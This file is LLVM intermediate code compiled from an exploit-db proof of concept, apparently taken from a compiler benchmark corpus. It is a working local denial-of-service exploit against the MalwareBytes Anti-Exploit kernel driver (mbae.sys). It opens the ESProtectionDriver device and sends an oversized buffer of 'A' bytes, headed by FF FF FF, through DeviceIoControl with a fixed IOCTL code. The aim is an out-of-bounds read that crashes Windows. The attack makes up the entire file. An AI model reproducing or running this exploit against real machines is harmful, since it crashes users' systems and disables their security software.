; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_35842.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_35842.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@MAX_PATH = common dso_local global i32 0, align 4
@__const.main.sizebytes = private unnamed_addr constant [4 x i8] c"\FF\FF\FF\00", align 1
@.str = private unnamed_addr constant [81 x i8] c"-------------------------------------------------------------------------------\0A\00", align 1
@.str.1 = private unnamed_addr constant [81 x i8] c"        MalwareBytes Anti-Exploit (mbae.sys) Out-of-bounds Read DoS            \0A\00", align 1
@.str.2 = private unnamed_addr constant [81 x i8] c"             Tested on Windows XP SP3/Windows 7 SP1 (32bit)                    \0A\00", align 1
@.str.3 = private unnamed_addr constant [82 x i8] c"-------------------------------------------------------------------------------\0A\0A\00", align 1
@.str.4 = private unnamed_addr constant [7 x i8] c"\\\\.\\%s\00", align 1
@.str.5 = private unnamed_addr constant [19 x i8] c"ESProtectionDriver\00", align 1
@BUFSIZE = common dso_local global i32 0, align 4
@MEM_COMMIT = common dso_local global i32 0, align 4
@MEM_RESERVE = common dso_local global i32 0, align 4
@PAGE_READWRITE = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [46 x i8] c"\0A[i] Size of total buffer being sent %d bytes\00", align 1
@GENERIC_READ = common dso_local global i32 0, align 4
@GENERIC_WRITE = common dso_local global i32 0, align 4
@FILE_SHARE_READ = common dso_local global i32 0, align 4
@FILE_SHARE_WRITE = common dso_local global i32 0, align 4
@OPEN_EXISTING = common dso_local global i32 0, align 4
@INVALID_HANDLE_VALUE = common dso_local global i64 0, align 8
@.str.7 = private unnamed_addr constant [29 x i8] c"\0A[-] Open %s device failed\0A\0A\00", align 1
@.str.8 = private unnamed_addr constant [31 x i8] c"\0A[+] Open %s device successful\00", align 1
@.str.9 = private unnamed_addr constant [32 x i8] c"\0A[~] Press any key to DoS . . .\00", align 1
@.str.10 = private unnamed_addr constant [23 x i8] c"\0A[+] DoS buffer sent\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i64, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i64, align 8
  %9 = alloca i32, align 4
  %10 = alloca [4 x i8], align 1
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %13 = load i32, i32* @MAX_PATH, align 4
  %14 = zext i32 %13 to i64
  %15 = call i8* @llvm.stacksave()
  store i8* %15, i8** %7, align 8
  %16 = alloca i8, i64 %14, align 16
  store i64 %14, i64* %8, align 8
  store i32 0, i32* %9, align 4
  %17 = bitcast [4 x i8]* %10 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %17, i8* align 1 getelementptr inbounds ([4 x i8], [4 x i8]* @__const.main.sizebytes, i32 0, i32 0), i64 4, i1 false)
  %18 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str, i64 0, i64 0))
  %19 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.1, i64 0, i64 0))
  %20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.2, i64 0, i64 0))
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.3, i64 0, i64 0))
  %22 = call i32 @sprintf(i8* %16, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.5, i64 0, i64 0))
  %23 = load i32, i32* @BUFSIZE, align 4
  %24 = load i32, i32* @MEM_COMMIT, align 4
  %25 = load i32, i32* @MEM_RESERVE, align 4
  %26 = or i32 %24, %25
  %27 = load i32, i32* @PAGE_READWRITE, align 4
  %28 = call i8* @VirtualAlloc(i32* null, i32 %23, i32 %26, i32 %27)
  store i8* %28, i8** %11, align 8
  %29 = load i8*, i8** %11, align 8
  %30 = load i32, i32* @BUFSIZE, align 4
  %31 = call i32 @memset(i8* %29, i32 65, i32 %30)
  %32 = load i8*, i8** %11, align 8
  %33 = getelementptr inbounds [4 x i8], [4 x i8]* %10, i64 0, i64 0
  %34 = call i32 @memcpy(i8* %32, i8* %33, i32 4)
  %35 = load i32, i32* @BUFSIZE, align 4
  %36 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.6, i64 0, i64 0), i32 %35)
  %37 = load i32, i32* @GENERIC_READ, align 4
  %38 = load i32, i32* @GENERIC_WRITE, align 4
  %39 = or i32 %37, %38
  %40 = load i32, i32* @FILE_SHARE_READ, align 4
  %41 = load i32, i32* @FILE_SHARE_WRITE, align 4
  %42 = or i32 %40, %41
  %43 = load i32, i32* @OPEN_EXISTING, align 4
  %44 = call i64 @CreateFile(i8* %16, i32 %39, i32 %42, i32* null, i32 %43, i32 0, i32* null)
  store i64 %44, i64* %6, align 8
  %45 = load i64, i64* %6, align 8
  %46 = load i64, i64* @INVALID_HANDLE_VALUE, align 8
  %47 = icmp eq i64 %45, %46
  br i1 %47, label %48, label %50

48:                                               ; preds = %2
  %49 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.7, i64 0, i64 0), i8* %16)
  store i32 -1, i32* %3, align 4
  store i32 1, i32* %12, align 4
  br label %62

50:                                               ; preds = %2
  %51 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.8, i64 0, i64 0), i8* %16)
  br label %52

52:                                               ; preds = %50
  %53 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.9, i64 0, i64 0))
  %54 = call i32 (...) @getch()
  %55 = load i64, i64* %6, align 8
  %56 = load i8*, i8** %11, align 8
  %57 = load i32, i32* @BUFSIZE, align 4
  %58 = call i32 @DeviceIoControl(i64 %55, i32 2285568, i8* %56, i32 %57, i32* null, i32 0, i32* %9, i32* null)
  %59 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.10, i64 0, i64 0))
  %60 = load i64, i64* %6, align 8
  %61 = call i32 @CloseHandle(i64 %60)
  store i32 0, i32* %3, align 4
  store i32 1, i32* %12, align 4
  br label %62

62:                                               ; preds = %52, %48
  %63 = load i8*, i8** %7, align 8
  call void @llvm.stackrestore(i8* %63)
  %64 = load i32, i32* %3, align 4
  ret i32 %64
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #2

declare dso_local i32 @printf(i8*, ...) #3

declare dso_local i32 @sprintf(i8*, i8*, i8*) #3

declare dso_local i8* @VirtualAlloc(i32*, i32, i32, i32) #3

declare dso_local i32 @memset(i8*, i32, i32) #3

declare dso_local i32 @memcpy(i8*, i8*, i32) #3

declare dso_local i64 @CreateFile(i8*, i32, i32, i32*, i32, i32, i32*) #3

declare dso_local i32 @getch(...) #3

declare dso_local i32 @DeviceIoControl(i64, i32, i8*, i32, i32*, i32, i32*, i32*) #3

declare dso_local i32 @CloseHandle(i64) #3

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { argmemonly nounwind willreturn }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
